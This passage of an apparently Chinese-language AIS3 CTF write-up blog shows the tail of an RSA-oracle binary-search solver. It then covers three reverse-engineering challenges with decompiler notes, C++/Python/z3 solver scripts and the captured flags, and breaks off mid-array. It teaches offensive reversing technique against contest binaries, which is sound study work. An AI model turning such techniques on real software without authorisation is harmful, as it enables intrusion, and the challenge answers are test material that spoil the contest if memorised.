class="keyword">in</span> k:</span><br><span class="line">        lr[<span class="number">1</span>]=(lr[<span class="number">0</span>]+lr[<span class="number">1</span>])//<span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        lr[<span class="number">0</span>]=(lr[<span class="number">0</span>]+lr[<span class="number">1</span>])//<span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(flag,lr)</span><br><span class="line">    flag+=<span class="number">1</span></span><br><span class="line">    pwr+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> lr[<span class="number">0</span>]==lr[<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">abs</span>(lr[<span class="number">0</span>]-lr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    m=lr[<span class="number">0</span>]+i</span><br><span class="line">    hint = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="keyword">if</span> hint == c:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(m))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(m, c)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>FLAG: <code>AIS3&#123;O0o0oO0o0oOooooO0o0oOOO0oO0o0o_Y0u_a43_4_tru1ly_Or4c13!!@#!@#!@#!@$!@$!@&#125;</code></p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Simply-Reverse-139"><a href="#Simply-Reverse-139" class="headerlink" title="Simply Reverse [139]"></a>Simply Reverse [139]</h2><div class="note default flat"><p>Just reverse it!</p>
</div>
<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/140muCIzd7q5vMZNwhL5DDLXAx6tguyHc/view?usp=sharing">https://drive.google.com/file/d/140muCIzd7q5vMZNwhL5DDLXAx6tguyHc/view?usp=sharing</a></p>
</blockquote>
<p>這題其實算是非常常見的Reverse基本題，用IDA看一下會發現裡面有一個<code>verify function</code>，<code>encrypted</code>是一個已知所有值的陣列，所以只要逆向之後利用他的if判斷式直接在printable ascii之中字典爆破就可以拿到flag了，從psuedo code可以看出flag長度為34。其中<code>*((signed int *)&amp;v2 - 1)</code>是index，<code>*(&amp;v2 - 3)</code>是flag陣列，而需要要注意的是<code>unsigned __int8</code>限制範圍在256，需要取mod 256才不會出錯。</p>
<p><img src="https://imgur.com/64zXG2R.png"></p>
<p>直接上exploit:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOS ios::sync_with_stdio(false);cin.tie(0);cout.tie(0);</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> enc[<span class="number">34</span>]=&#123;</span><br><span class="line">  <span class="number">138</span>,  <span class="number">80</span>, <span class="number">146</span>, <span class="number">200</span>,   <span class="number">6</span>,  <span class="number">61</span>,  <span class="number">91</span>, <span class="number">149</span>, <span class="number">182</span>,  <span class="number">82</span>, </span><br><span class="line">   <span class="number">27</span>,  <span class="number">53</span>, <span class="number">130</span>,  <span class="number">90</span>, <span class="number">234</span>, <span class="number">248</span>, <span class="number">148</span>,  <span class="number">40</span>, <span class="number">114</span>, <span class="number">221</span>, </span><br><span class="line">  <span class="number">212</span>,  <span class="number">93</span>, <span class="number">227</span>,  <span class="number">41</span>, <span class="number">186</span>,  <span class="number">88</span>,  <span class="number">82</span>, <span class="number">168</span>, <span class="number">100</span>,  <span class="number">53</span>, </span><br><span class="line">  <span class="number">129</span>, <span class="number">172</span>,  <span class="number">10</span>, <span class="number">100</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int32_t</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">IOS</span></span><br><span class="line"><span class="function">    <span class="title">for</span><span class="params">(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">34</span>;i++)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">128</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(enc[i]==((((i^j)&lt;&lt;((i^<span class="number">9</span>)&amp;<span class="number">3</span>))|((i^j)&gt;&gt;(<span class="number">8</span>-((i^<span class="number">9</span>)&amp;<span class="number">3</span>))))+<span class="number">8</span>)%<span class="number">256</span>)&#123;</span><br><span class="line">                cout&lt;&lt;<span class="built_in">char</span>(j);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>FLAG: <code>AIS3&#123;0ld_Ch@1_R3V1_fr@m_AIS32016!&#125;</code></p>
<h2 id="Flag-Sleeper-379"><a href="#Flag-Sleeper-379" class="headerlink" title="Flag Sleeper [379]"></a>Flag Sleeper [379]</h2><div class="note default flat"><p>Taking a nap before entering the world of AIS3 is important! A good hacker requires good sleep, and so does this flag checker.</p>
<p>Author: TwinkleStar03 ✨</p>
</div>
<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1-AkPHIHF0G9Y-3BMes2QHb1slRGeHuUo/view?usp=sharing">https://drive.google.com/file/d/1-AkPHIHF0G9Y-3BMes2QHb1slRGeHuUo/view?usp=sharing</a></p>
</blockquote>
<p>這題執行之後會發現他只會噴一個表情符號給你，但用IDA看不出甚麼東西，所以改用Ghidra，裡面可以發現<code>main</code>函數上面的一堆數字應該是三個陣列，而下面的code雖然有<code>rand()</code>，但他很明顯將<code>iVar2</code>限制在<code>0x34</code>之內，用這個來去取<code>iVar1</code>的值，而下方又利用<code>iVar2</code>作為index去將其餘兩個陣列的元素做xor，所以合理懷疑<code>iVar1</code>，也就是<code>local_358</code>是儲存index的陣列，而flag長度就是<code>0x34</code>。</p>
<p><img src="https://imgur.com/2YjK62d.png"></p>
<p>接下來，他將其他兩個陣列的數字利用<code>iVar2</code>作為index來xor，所以另外兩個陣列xor應該就是flag的字元，而根據index重新排列就能得到flag。直接寫出exploit拿到flag。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOS ios::sync_with_stdio(false);cin.tie(0);cout.tie(0);</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ind[<span class="number">0x34</span>]=&#123;<span class="number">10</span>,<span class="number">0xc</span>,<span class="number">0x1c</span>,<span class="number">7</span>,<span class="number">0x26</span>,<span class="number">0x1f</span>,<span class="number">0x2f</span>,<span class="number">0x2c</span>,<span class="number">0x2a</span>,<span class="number">0x23</span>,<span class="number">0x30</span>,<span class="number">0x1e</span>,<span class="number">0x15</span>,<span class="number">0xb</span>,<span class="number">0x11</span>,<span class="number">0x10</span>,<span class="number">0x22</span>,<span class="number">0x28</span>,<span class="number">0x21</span>,<span class="number">0x27</span>,<span class="number">0x29</span>,<span class="number">9</span>,<span class="number">0x16</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">0x14</span>,<span class="number">0x13</span>,<span class="number">0x2e</span>,<span class="number">0x17</span>,<span class="number">0x2d</span>,<span class="number">0x1a</span>,<span class="number">0</span>,<span class="number">0xf</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">0x2b</span>,<span class="number">0xe</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">0x1b</span>,<span class="number">0x31</span>,<span class="number">1</span>,<span class="number">0x33</span>,<span class="number">0x24</span>,<span class="number">0x25</span>,<span class="number">0x18</span>,<span class="number">0x19</span>,<span class="number">0x32</span>,<span class="number">0x20</span>,<span class="number">0xd</span>,<span class="number">0x1d</span>,<span class="number">0x12</span>&#125;;</span><br><span class="line"><span class="type">int</span> a[<span class="number">0x34</span>]=&#123;<span class="number">0xd4</span>,<span class="number">0xe8</span>,<span class="number">0xa4</span>,<span class="number">0x1c</span>,<span class="number">0xfd</span>,<span class="number">0x84</span>,<span class="number">0xc2</span>,<span class="number">0x2f</span>,<span class="number">0x2e</span>,<span class="number">0x96</span>,<span class="number">0x60</span>,<span class="number">0xd8</span>,<span class="number">0x79</span>,<span class="number">0xd8</span>,<span class="number">0x8c</span>,<span class="number">0xa4</span>,<span class="number">0x31</span>,<span class="number">0xdb</span>,<span class="number">0x93</span>,<span class="number">0xfc</span>,<span class="number">0xc9</span>,<span class="number">0x1c</span>,<span class="number">9</span>,<span class="number">0xbc</span>,<span class="number">0x9b</span>,<span class="number">0x4f</span>,<span class="number">0x85</span>,<span class="number">0xff</span>,<span class="number">0x68</span>,<span class="number">0x14</span>,<span class="number">0x57</span>,<span class="number">0x40</span>,<span class="number">0x93</span>,<span class="number">0x8f</span>,<span class="number">0x44</span>,<span class="number">0x93</span>,<span class="number">0x8e</span>,<span class="number">0x60</span>,<span class="number">0xa5</span>,<span class="number">0xf4</span>,<span class="number">0x3e</span>,<span class="number">0x3a</span>,<span class="number">0x77</span>,<span class="number">0x19</span>,<span class="number">0x3d</span>,<span class="number">0x38</span>,<span class="number">0x47</span>,<span class="number">0xb6</span>,<span class="number">7</span>,<span class="number">0x25</span>,<span class="number">1</span>,<span class="number">0x9a</span>&#125;;</span><br><span class="line"><span class="type">int</span> b[<span class="number">0x34</span>]=&#123;<span class="number">0xed</span>,<span class="number">0xd9</span>,<span class="number">0xd4</span>,<span class="number">0x28</span>,<span class="number">0x95</span>,<span class="number">0xdb</span>,<span class="number">0xa5</span>,<span class="number">0x70</span>,<span class="number">0x1d</span>,<span class="number">0xf1</span>,<span class="number">8</span>,<span class="number">0xbd</span>,<span class="number">0xd</span>,<span class="number">0xe0</span>,<span class="number">0xd3</span>,<span class="number">0x95</span>,<span class="number">5</span>,<span class="number">0xb8</span>,<span class="number">0xff</span>,<span class="number">0xcf</span>,<span class="number">0xa2</span>,<span class="number">0x7a</span>,<span class="number">0x56</span>,<span class="number">199</span>,<span class="number">0xaa</span>,<span class="number">0x7a</span>,<span class="number">0xf0</span>,<span class="number">0xce</span>,<span class="number">9</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">1</span>,<span class="number">0xa3</span>,<span class="number">0xbc</span>,<span class="number">0x77</span>,<span class="number">0xe1</span>,<span class="number">0xef</span>,<span class="number">3</span>,<span class="number">0xf6</span>,<span class="number">0x99</span>,<span class="number">9</span>,<span class="number">0x73</span>,<span class="number">10</span>,<span class="number">0x46</span>,<span class="number">0x5e</span>,<span class="number">0x67</span>,<span class="number">0x34</span>,<span class="number">0x89</span>,<span class="number">0x61</span>,<span class="number">0x1d</span>,<span class="number">0x6d</span>,<span class="number">0xd0</span>&#125;;</span><br><span class="line"><span class="type">int</span> flag[<span class="number">0x34</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int32_t</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x34</span>;i++)&#123;</span><br><span class="line">        flag[ind[i]]=a[i]^b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x34</span>;i++)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="built_in">char</span>(flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>FLAG: <code>AIS3&#123;c143f9818a01_Ju5t_a_s1mple_fl4g_ch3ck3r_r1gh7?&#125;</code></p>
<h2 id="Vivid-Emotion-493"><a href="#Vivid-Emotion-493" class="headerlink" title="Vivid Emotion [493]"></a>Vivid Emotion [493]</h2><div class="note default flat"><p>If you failed on this, I’ll give you some lovely emojis to cheer you up! Keep going until you see the Success!</p>
<p>To get the flag, store your answers into a file and run <code>flag-decryptor.py</code> .</p>
<p>There are some requirements for decryptor:</p>
<ul>
<li>Install python package pycryptodome<ul>
<li><code>pip install pycryptodome</code></li>
</ul>
</li>
<li>To let decryptor works properly, answer_file’s content must follow the format. Please arrange your answers correctly.<ul>
<li>If you don’t like my decryptor, you can reverse it and rewrite it!</li>
</ul>
</li>
</ul>
<blockquote>
<p>If you step into some problem while checking answers using the checker, Use pwntools process to send answers to program may help.</p>
</blockquote>
<p>Author: TwinkleStar03 🌟</p>
</div>
<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/10_qEMNX18pZE7o269Fy-seph-eHgnzxL/view?usp=sharing">https://drive.google.com/file/d/10_qEMNX18pZE7o269Fy-seph-eHgnzxL/view?usp=sharing</a></p>
</blockquote>
<p>先把這題的elf跑起來，會發現他要輸入一個<code>secret number</code>，稍微逆一下就知道這個數字是<code>333</code>。而在輸入<code>333</code>之後，接下來需要輸入333個數字做為<code>secret</code>，而很明顯可以發現這些數字的條件判斷函數存在於所有<code>chk</code>開頭的區塊裡面，而這個就可以用z3 solver解決，因此寫個exploit來把數字解出來。</p>
<p><img src="https://imgur.com/NMLFmHV.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = IntVector(<span class="string">&#x27;x&#x27;</span>, <span class="number">333</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># s.add(...)</span></span><br><span class="line"><span class="comment"># 詳見HackMD https://hackmd.io/@M3t30r/Bk4n4dkIn#Vivid-Emotion-493</span></span><br><span class="line"></span><br><span class="line">flag= [<span class="number">0</span>*<span class="number">333</span>]</span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line">m = s.model()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(m[i])</span><br></pre></td></tr></table></figure>

<p>解出來之後把它們依照index重新排列並且放到ans.txt裡面，送回<code>flag-decryptor.py</code>就能夠拿到flag了。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rearrange</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOS ios::sync_with_stdio(false);cin.tie(0);cout.tie(0);</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ind[<span class="number">335</span>]=&#123;<span class="number">283</span>,<span class="number">314</span>,<span class="number">286</span>,<span class="number">277</span>,<span class="number">294</span>,<span class="number">295</span>,<span class="number">329</span>,<span class="number">285</span>,<span class="number">233</span>,<span class="number">202</span>,<span class="number">235</span>,<span class="number">243</span>,<span class="number">207</span>,<span class="number">332</span>,<span class="number">247</span>,<span class="number">238</span>,<span class="number">229</span>,<span class="number">225</span>,<span class="number">179</span>,<span class="number">257</span>,<span class="number">293</span>,<span class="number">269</span>,<span class="number">324</span>,<span class="number">100</span>,<span class="number">255</span>,<span class="number">246</span>,<span class="number">323</span>,<span class="number">301</span>,<span class="number">307</span>,<span class="number">183</span>,<span class="number">245</span>,<span class="number">318</span>,<span class="number">331</span>,<span class="number">218</span>,<span class="number">275</span>,<span class="number">288</span>,<span class="number">322</span>,<span class="number">261</span>,<span class="number">219</span>,<span class="number">289</span>,<span class="number">317</span>,<span class="number">266</span>,<span class="number">321</span>,<span class="number">259</span>,<span class="number">140</span>,<span class="number">157</span>,<span class="number">113</span>,<span class="number">172</span>,<span class="number">107</span>,<span class="number">68</span>,<span class="number">312</span>,<span class="number">163</span>,<span class="number">84</span>,<span class="number">287</span>,<span class="number">21</span>,<span class="number">187</span>,<span class="number">276</span>,<span class="number">216</span>,<span class="number">136</span>,<span class="number">42</span>,<span class="number">44</span>,<span class="number">76</span>,<span class="number">118</span>,<span class="number">160</span>,<span class="number">123</span>,<span class="number">311</span>,<span class="number">133</span>,<span class="number">64</span>,<span class="number">26</span>,<span class="number">43</span>,<span class="number">18</span>,<span class="number">40</span>,<span class="number">139</span>,<span class="number">119</span>,<span class="number">77</span>,<span class="number">101</span>,<span class="number">274</span>,<span class="number">188</span>,<span class="number">217</span>,<span class="number">28</span>,<span class="number">244</span>,<span class="number">125</span>,<span class="number">292</span>,<span class="number">32</span>,<span class="number">224</span>,<span class="number">305</span>,<span class="number">273</span>,<span class="number">47</span>,<span class="number">214</span>,<span class="number">92</span>,<span class="number">95</span>,<span class="number">155</span>,<span class="number">132</span>,<span class="number">328</span>,<span class="number">313</span>,<span class="number">319</span>,<span class="number">90</span>,<span class="number">267</span>,<span class="number">176</span>,<span class="number">248</span>,<span class="number">6</span>,<span class="number">253</span>,<span class="number">105</span>,<span class="number">206</span>,<span class="number">173</span>,<span class="number">102</span>,<span class="number">262</span>,<span class="number">190</span>,<span class="number">296</span>,<span class="number">168</span>,<span class="number">33</span>,<span class="number">242</span>,<span class="number">325</span>,<span class="number">271</span>,<span class="number">45</span>,<span class="number">171</span>,<span class="number">249</span>,<span class="number">310</span>,<span class="number">19</span>,<span class="number">167</span>,<span class="number">79</span>,<span class="number">197</span>,<span class="number">177</span>,<span class="number">120</span>,<span class="number">284</span>,<span class="number">148</span>,<span class="number">12</span>,<span class="number">78</span>,<span class="number">327</span>,<span class="number">193</span>,<span class="number">196</span>,<span class="number">85</span>,<span class="number">215</span>,<span class="number">127</span>,<span class="number">144</span>,<span class="number">170</span>,<span class="number">212</span>,<span class="number">22</span>,<span class="number">108</span>,<span class="number">81</span>,<span class="number">99</span>,<span class="number">96</span>,<span class="number">152</span>,<span class="number">29</span>,<span class="number">88</span>,<span class="number">93</span>,<span class="number">110</span>,<span class="number">9</span>,<span class="number">82</span>,<span class="number">221</span>,<span class="number">2</span>,<span class="number">182</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">185</span>,<span class="number">31</span>,<span class="number">232</span>,<span class="number">236</span>,<span class="number">222</span>,<span class="number">91</span>,<span class="number">278</span>,<span class="number">256</span>,<span class="number">124</span>,<span class="number">130</span>,<span class="number">165</span>,<span class="number">290</span>,<span class="number">16</span>,<span class="number">25</span>,<span class="number">137</span>,<span class="number">279</span>,<span class="number">134</span>,<span class="number">231</span>,<span class="number">315</span>,<span class="number">189</span>,<span class="number">330</span>,<span class="number">36</span>,<span class="number">205</span>,<span class="number">192</span>,<span class="number">142</span>,<span class="number">252</span>,<span class="number">213</span>,<span class="number">264</span>,<span class="number">198</span>,<span class="number">200</span>,<span class="number">251</span>,<span class="number">14</span>,<span class="number">150</span>,<span class="number">94</span>,<span class="number">115</span>,<span class="number">166</span>,<span class="number">298</span>,<span class="number">86</span>,<span class="number">135</span>,<span class="number">46</span>,<span class="number">145</span>,<span class="number">241</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">59</span>,<span class="number">158</span>,<span class="number">204</span>,<span class="number">111</span>,<span class="number">180</span>,<span class="number">30</span>,<span class="number">38</span>,<span class="number">228</span>,<span class="number">89</span>,<span class="number">210</span>,<span class="number">49</span>,<span class="number">223</span>,<span class="number">17</span>,<span class="number">117</span>,<span class="number">128</span>,<span class="number">131</span>,<span class="number">309</span>,<span class="number">153</span>,<span class="number">164</span>,<span class="number">282</span>,<span class="number">69</span>,<span class="number">121</span>,<span class="number">184</span>,<span class="number">83</span>,<span class="number">308</span>,<span class="number">57</span>,<span class="number">237</span>,<span class="number">297</span>,<span class="number">5</span>,<span class="number">226</span>,<span class="number">230</span>,<span class="number">4</span>,<span class="number">54</span>,<span class="number">75</span>,<span class="number">320</span>,<span class="number">272</span>,<span class="number">270</span>,<span class="number">300</span>,<span class="number">52</span>,<span class="number">263</span>,<span class="number">156</span>,<span class="number">8</span>,<span class="number">80</span>,<span class="number">162</span>,<span class="number">195</span>,<span class="number">51</span>,<span class="number">61</span>,<span class="number">220</span>,<span class="number">209</span>,<span class="number">146</span>,<span class="number">281</span>,<span class="number">302</span>,<span class="number">56</span>,<span class="number">109</span>,<span class="number">154</span>,<span class="number">280</span>,<span class="number">114</span>,<span class="number">138</span>,<span class="number">208</span>,<span class="number">35</span>,<span class="number">265</span>,<span class="number">1</span>,<span class="number">227</span>,<span class="number">63</span>,<span class="number">20</span>,<span class="number">112</span>,<span class="number">291</span>,<span class="number">316</span>,<span class="number">201</span>,<span class="number">159</span>,<span class="number">326</span>,<span class="number">71</span>,<span class="number">72</span>,<span class="number">58</span>,<span class="number">240</span>,<span class="number">97</span>,<span class="number">203</span>,<span class="number">250</span>,<span class="number">60</span>,<span class="number">62</span>,<span class="number">161</span>,<span class="number">67</span>,<span class="number">27</span>,<span class="number">55</span>,<span class="number">191</span>,<span class="number">126</span>,<span class="number">169</span>,<span class="number">34</span>,<span class="number">122</span>,<span class="number">186</span>,<span class="number">0</span>,<span class="number">23</span>,<span class="number">50</span>,<span class="number">239</span>,<span class="number">87</span>,<span class="number">73</span>,<span class="number">147</span>,<span class="number">175</span>,<span class="number">199</span>,<span class="number">306</span>,<span class="number">66</span>,<span class="number">74</span>,<span class="number">98</span>,<span class="number">3</span>,<span class="number">65</span>,<span class="number">7</span>,<span class="number">299</span>,<span class="number">37</span>,<span class="number">141</span>,<span class="number">149</span>,<span class="number">303</span>,<span class="number">103</span>,<span class="number">178</span>,<span class="number">53</span>,<span class="number">116</span>,<span class="number">151</span>,<span class="number">211</span>,<span class="number">48</span>,<span class="number">304</span>,<span class="number">24</span>,<span class="number">143</span>,<span class="number">104</span>,<span class="number">254</span>,<span class="number">234</span>,<span class="number">260</span>,<span class="number">174</span>,<span class="number">70</span>,<span class="number">129</span>,<span class="number">181</span>,<span class="number">268</span>,<span class="number">39</span>,<span class="number">194</span>,<span class="number">258</span>,<span class="number">41</span>,<span class="number">106</span>&#125;;</span><br><span class="line"><span class="type">int</span> val[<span class="number">335</span>]=&#123;<span class="number">152</span>,<span class="number">180</span>,<span class="number">108</span>,<span class="number">4</span>,<span class="number">136</span>,<span class="number">62</span>,<span class="number">123</span>,<span class="number">238</span>,<span class="number">187</span>,<span class="number">182</span>,<span class="number">200</span>,<span class="number">38</span>,<span class="number">214</span>,<span class="number">221</span>,<span class="number">205</span>,<span class="number">82</span>,<span class="number">12</span>,<span class="number">40</span>,<span class="number">156</span>,<span class="number">81</span>,<span class="number">21</span>,<span class="number">14</span>,<span class="number">132</span>,<span class="number">205</span>,<span class="number">77</span>,<span class="number">13</span>,<span class="number">33</span>,<span class="number">165</span>,<span class="number">157</span>,<span class="number">235</span>,<span class="number">44</span>,<span class="number">113</span>,<span class="number">199</span>,<span class="number">93</span>,<span class="number">83</span>,<span class="number">115</span>,<span class="number">92</span>,<span class="number">160</span>,<span class="number">95</span>,<span class="number">34</span>,<span class="number">50</span>,<span class="number">164</span>,<span class="number">67</span>,<span class="number">12</span>,<span class="number">215</span>,<span class="number">40</span>,<span class="number">61</span>,<span class="number">1</span>,<span class="number">205</span>,<span class="number">169</span>,<span class="number">134</span>,<span class="number">249</span>,<span class="number">243</span>,<span class="number">238</span>,<span class="number">113</span>,<span class="number">61</span>,<span class="number">242</span>,<span class="number">80</span>,<span class="number">204</span>,<span class="number">157</span>,<span class="number">237</span>,<span class="number">1</span>,<span class="number">210</span>,<span class="number">163</span>,<span class="number">70</span>,<span class="number">8</span>,<span class="number">124</span>,<span class="number">131</span>,<span class="number">107</span>,<span class="number">220</span>,<span class="number">2</span>,<span class="number">111</span>,<span class="number">9</span>,<span class="number">154</span>,<span class="number">186</span>,<span class="number">192</span>,<span class="number">189</span>,<span class="number">46</span>,<span class="number">205</span>,<span class="number">209</span>,<span class="number">246</span>,<span class="number">160</span>,<span class="number">199</span>,<span class="number">175</span>,<span class="number">82</span>,<span class="number">195</span>,<span class="number">105</span>,<span class="number">43</span>,<span class="number">0</span>,<span class="number">134</span>,<span class="number">153</span>,<span class="number">220</span>,<span class="number">184</span>,<span class="number">21</span>,<span class="number">156</span>,<span class="number">187</span>,<span class="number">246</span>,<span class="number">232</span>,<span class="number">94</span>,<span class="number">172</span>,<span class="number">175</span>,<span class="number">93</span>,<span class="number">189</span>,<span class="number">160</span>,<span class="number">20</span>,<span class="number">155</span>,<span class="number">197</span>,<span class="number">251</span>,<span class="number">241</span>,<span class="number">154</span>,<span class="number">172</span>,<span class="number">247</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">119</span>,<span class="number">207</span>,<span class="number">105</span>,<span class="number">127</span>,<span class="number">72</span>,<span class="number">245</span>,<span class="number">163</span>,<span class="number">135</span>,<span class="number">132</span>,<span class="number">31</span>,<span class="number">58</span>,<span class="number">8</span>,<span class="number">236</span>,<span class="number">239</span>,<span class="number">154</span>,<span class="number">196</span>,<span class="number">177</span>,<span class="number">61</span>,<span class="number">167</span>,<span class="number">61</span>,<span class="number">110</span>,<span class="number">96</span>,<span class="number">250</span>,<span class="number">159</span>,<span class="number">137</span>,<span class="number">10</span>,<span class="number">174</span>,<span class="number">76</span>,<span class="number">235</span>,<span class="number">206</span>,<span class="number">102</span>,<span class="number">29</span>,<span class="number">63</span>,<span class="number">215</span>,<span class="number">55</span>,<span class="number">52</span>,<span class="number">14</span>,<span class="number">36</span>,<span class="number">117</span>,<span class="number">134</span>,<span class="number">185</span>,<span class="number">14</span>,<span class="number">45</span>,<span class="number">22</span>,<span class="number">27</span>,<span class="number">222</span>,<span class="number">84</span>,<span class="number">237</span>,<span class="number">164</span>,<span class="number">19</span>,<span class="number">175</span>,<span class="number">91</span>,<span class="number">16</span>,<span class="number">176</span>,<span class="number">31</span>,<span class="number">7</span>,<span class="number">60</span>,<span class="number">24</span>,<span class="number">74</span>,<span class="number">89</span>,<span class="number">36</span>,<span class="number">47</span>,<span class="number">103</span>,<span class="number">131</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">151</span>,<span class="number">49</span>,<span class="number">47</span>,<span class="number">12</span>,<span class="number">110</span>,<span class="number">209</span>,<span class="number">37</span>,<span class="number">212</span>,<span class="number">46</span>,<span class="number">247</span>,<span class="number">17</span>,<span class="number">224</span>,<span class="number">110</span>,<span class="number">183</span>,<span class="number">68</span>,<span class="number">231</span>,<span class="number">67</span>,<span class="number">186</span>,<span class="number">119</span>,<span class="number">235</span>,<span class="number">28</span>,<span class="number">214</span>,<span class="number">106</span>,<span class="number">48</span>,<span class="number">91</span>,<span class="number">249</span>,<span class="number">206</span>,<span class="number">0</span>,<span class="number">147</span>,<span class="number">79</span>,<span class="number">234</span>,<span 